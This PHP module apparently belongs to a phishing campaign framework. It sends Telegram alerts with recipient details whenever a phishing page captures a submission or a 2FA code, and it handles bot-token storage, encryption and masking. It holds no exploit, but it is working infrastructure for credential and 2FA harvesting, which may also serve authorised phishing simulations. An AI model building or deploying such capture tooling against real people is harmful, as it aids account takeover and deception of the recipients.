<?php
/**
 * Phase 3.53: Telegram bot alerting.
 *
 * A parallel notification channel to the Phase 3.42 capture webhook
 * (Slack / Teams / Discord). Fires on the SAME events — first capture
 * per recipient + repeat 2FA submit — but delivers via the Telegram
 * Bot API instead of a generic incoming-webhook URL.
 *
 * Telegram needs two pieces, not a single URL:
 *   - bot token  (from @BotFather, shape "<digits>:<35+ url-safe chars>")
 *   - chat id    (numeric, negative for groups, or @channelusername)
 *
 * Both are stored together as encrypted-at-rest JSON in tb_store
 * (type='telegram', name='config') via the Phase 3.38 envelope.
 *
 * The message formatter + validators are pure and tested in isolation
 * (tests/TelegramAlertingTest.php). The HTTP send uses an injectable
 * seam so the unit suite never touches the network. The token is never
 * returned to the browser after it's stored — the settings load action
 * returns only a fixed-width mask.
 */

if (!function_exists('taphish_telegram_validate_token')) {
    /**
     * BotFather tokens look like "123456789:AAE...". Digits, a colon,
     * then 30+ url-safe chars. Reject anything else before issuing a
     * request so we don't leak a malformed token in the API URL.
     */
    function taphish_telegram_validate_token(string $token): bool
    {
        return preg_match('/^\d{6,}:[A-Za-z0-9_-]{30,}$/', trim($token)) === 1;
    }
}

if (!function_exists('taphish_telegram_validate_chat_id')) {
    /**
     * chat_id is either a (possibly negative) integer for a user /
     * group, or "@channelusername" for a public channel.
     */
    function taphish_telegram_validate_chat_id(string $chatId): bool
    {
        $c = trim($chatId);
        if ($c === '') return false;
        if (preg_match('/^-?\d+$/', $c)) return true;
        return preg_match('/^@[A-Za-z0-9_]{5,}$/', $c) === 1;
    }
}

if (!function_exists('taphish_telegram_format_capture')) {
    /**
     * Build the plain-text Telegram message for a capture event. Same
     * $event shape the capture-webhook payload builder consumes:
     *
     *   campaign        — campaign name
     *   campaign_id     — opaque id
     *   recipient_name  — operator-supplied name (may be empty)
     *   recipient_email — operator-supplied email
     *   captured_at     — unix epoch ms
     *   page            — int page number (0 = visit)
     *   ip              — public IP (or empty)
     *   has_2fa         — bool: did the capture carry a 2FA code
     *   is_repeat       — bool: repeat capture (vs first)
     *
     * Output is plain text (no parse_mode) so operator-controlled
     * fields can't break Markdown/HTML parsing or be used for
     * injection. Telegram renders newlines natively.
     */
    function taphish_telegram_format_capture(array $event): string
    {
        $name  = trim((string)($event['recipient_name'] ?? ''));
        $email = trim((string)($event['recipient_email'] ?? ''));
        $camp  = trim((string)($event['campaign'] ?? ''));
        $ip    = trim((string)($event['ip'] ?? ''));
        $page  = (int)($event['page'] ?? 0);
        $ts    = (int)($event['captured_at'] ?? 0);
        $iso   = $ts > 0 ? gmdate('Y-m-d H:i:s', intdiv($ts, 1000)) . ' UTC' : '';

        $who = $name !== '' ? ($name . ' <' . $email . '>') : $email;
        if ($who === '') $who = 'unknown recipient';

        $headline = !empty($event['is_repeat'])
            ? '🔁 Repeat capture'
            : '🎣 New capture';
        if (!empty($event['has_2fa'])) {
            $headline .= ' [+2FA]';
        }

        $lines = [
            $headline,
            'Campaign: ' . ($camp !== '' ? $camp : '(unnamed)'),
            'Recipient: ' . $who,
        ];
        if ($page > 0)   $lines[] = 'Page: ' . $page;
        if ($ip !== '')  $lines[] = 'IP: ' . $ip;
        if ($iso !== '') $lines[] = 'Captured: ' . $iso;

        return implode("\n", $lines);
    }
}

if (!function_exists('taphish_telegram_send')) {
    /**
     * POST a text message to the Telegram Bot API. Returns true on a
     * 2xx response, false otherwise. 5-second timeout — the tracker
     * endpoint must never hang the recipient's browser on a slow
     * Telegram.
     *
     * The $http seam lets tests assert the request without a network
     * call. Production callers pass null and the default cURL transport
     * runs.
     *
     * @param callable|null $http function($url, $postFields):array{status:int,body:string}
     */
    function taphish_telegram_send(string $botToken, string $chatId, string $text, ?callable $http = null): bool
    {
        if (!taphish_telegram_validate_token($botToken) || !taphish_telegram_validate_chat_id($chatId)) {
            return false;
        }
        if (trim($text) === '') {
            return false;
        }
        $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
        $fields = [
            'chat_id'                  => $chatId,
            'text'                     => $text,
            'disable_web_page_preview' => 'true',
        ];
        $fn = $http ?? 'taphish_telegram_default_http';
        $resp = $fn($url, $fields);
        $status = (int)($resp['status'] ?? 0);
        return $status >= 200 && $status < 300;
    }
}

if (!function_exists('taphish_telegram_default_http')) {
    /**
     * Default cURL transport for taphish_telegram_send(). Short timeout;
     * application/x-www-form-urlencoded body. Returns {status, body}.
     */
    function taphish_telegram_default_http(string $url, array $fields): array
    {
        if (!function_exists('curl_init')) {
            return ['status' => 0, 'body' => ''];
        }
        $ch = curl_init($url);
        if ($ch === false) return ['status' => 0, 'body' => ''];
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($fields),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT        => 5,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
        ]);
        $body   = curl_exec($ch);
        $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ['status' => $status, 'body' => is_string($body) ? $body : ''];
    }
}

if (!function_exists('taphish_telegram_config_serialize')) {
    /**
     * Pure JSON serializer for the {token, chat_id} pair. The exact
     * string the at-rest envelope encrypts.
     */
    function taphish_telegram_config_serialize(string $token, string $chatId): string
    {
        return (string) json_encode([
            'token'   => trim($token),
            'chat_id' => trim($chatId),
        ], JSON_UNESCAPED_SLASHES);
    }
}

if (!function_exists('taphish_telegram_config_deserialize')) {
    /**
     * Inverse of the serializer. Null on any shape this code didn't
     * write itself.
     *
     * @return array{token:string, chat_id:string}|null
     */
    function taphish_telegram_config_deserialize(?string $payload): ?array
    {
        if ($payload === null || $payload === '') return null;
        $j = json_decode($payload, true);
        if (!is_array($j) || !isset($j['token'], $j['chat_id'])) return null;
        return [
            'token'   => (string) $j['token'],
            'chat_id' => (string) $j['chat_id'],
        ];
    }
}

if (!function_exists('taphish_telegram_mask_token')) {
    /**
     * Fixed-width mask so the token length / value doesn't leak when
     * the settings load action returns the current config.
     */
    function taphish_telegram_mask_token(string $token): string
    {
        if ($token === '') return '';
        // Show the numeric bot id prefix (public, before the colon) +
        // a mask for the secret half so the operator recognizes which
        // bot is configured without exposing the secret.
        $colon = strpos($token, ':');
        $prefix = $colon !== false ? substr($token, 0, $colon) : '';
        return ($prefix !== '' ? $prefix . ':' : '') . '••••••••';
    }
}

if (!function_exists('taphish_set_telegram_config')) {
    /**
     * Upsert the encrypted {token, chat_id} into tb_store
     * (type='telegram', name='config'). Encrypts via the Phase 3.38
     * envelope when a key is available; refuses to write plaintext
     * secrets if the envelope is unavailable (same posture as the
     * Phase 3.52 BeEF settings fix).
     *
     * Passing an empty token deletes the row (disables the channel).
     */
    function taphish_set_telegram_config(\mysqli $conn, string $token, string $chatId): bool
    {
        if (trim($token) === '') {
            $del = $conn->prepare("DELETE FROM tb_store WHERE type='telegram' AND name='config'");
            if ($del === false) return false;
            $ok = $del->execute();
            $del->close();
            return (bool) $ok;
        }
        $payload   = taphish_telegram_config_serialize($token, $chatId);
        $encrypted = false;
        if (function_exists('secret_at_rest_get_key') && function_exists('secret_at_rest_encrypt')) {
            $key = secret_at_rest_get_key();
            if ($key !== null) {
                $enc = secret_at_rest_encrypt($payload, $key);
                if ($enc !== null) { $payload = $enc; $encrypted = true; }
            }
        }
        if (!$encrypted) {
            // Don't store the bot token in plaintext.
            return false;
        }
        $del = $conn->prepare("DELETE FROM tb_store WHERE type='telegram' AND name='config'");
        if ($del !== false) { $del->execute(); $del->close(); }
        $ins = $conn->prepare(
            "INSERT INTO tb_store (type, name, info, content) VALUES ('telegram', 'config', 'Phase 3.53 Telegram bot alerting', ?)"
        );
        if ($ins === false) return false;
        $ins->bind_param('s', $payload);
        $ok = $ins->execute();
        $ins->close();
        return (bool) $ok;
    }
}

if (!function_exists('taphish_get_telegram_config')) {
    /**
     * Read + decrypt the Telegram config. Returns null if unset /
     * undecryptable.
     *
     * @return array{token:string, chat_id:string}|null
     */
    function taphish_get_telegram_config(\mysqli $conn): ?array
    {
        $stmt = $conn->prepare("SELECT content FROM tb_store WHERE type='telegram' AND name='config'");
        if ($stmt === false) return null;
        $stmt->execute();
        $row = $stmt->get_result()->fetch_assoc();
        $stmt->close();
        if (!$row || empty($row['content'])) return null;
        $payload = (string) $row['content'];
        if (function_exists('secret_at_rest_get_key') && function_exists('secret_at_rest_passthrough_decrypt')) {
            $key = secret_at_rest_get_key();
            if ($key !== null) {
                $plain = secret_at_rest_passthrough_decrypt($payload, $key);
                if (is_string($plain)) $payload = $plain;
            }
        }
        return taphish_telegram_config_deserialize($payload);
    }
}

if (!function_exists('taphish_telegram_notify_capture')) {
    /**
     * Convenience wrapper used at the fire points (track.php): load the
     * config, format the event, send. No-op (returns false) if Telegram
     * isn't configured. Silent on failure — we never want to leak that
     * we're watching, and never hang the recipient's browser.
     */
    function taphish_telegram_notify_capture(\mysqli $conn, array $event): bool
    {
        $cfg = taphish_get_telegram_config($conn);
        if ($cfg === null) return false;
        $text = taphish_telegram_format_capture($event);
        return @taphish_telegram_send($cfg['token'], $cfg['chat_id'], $text);
    }
}
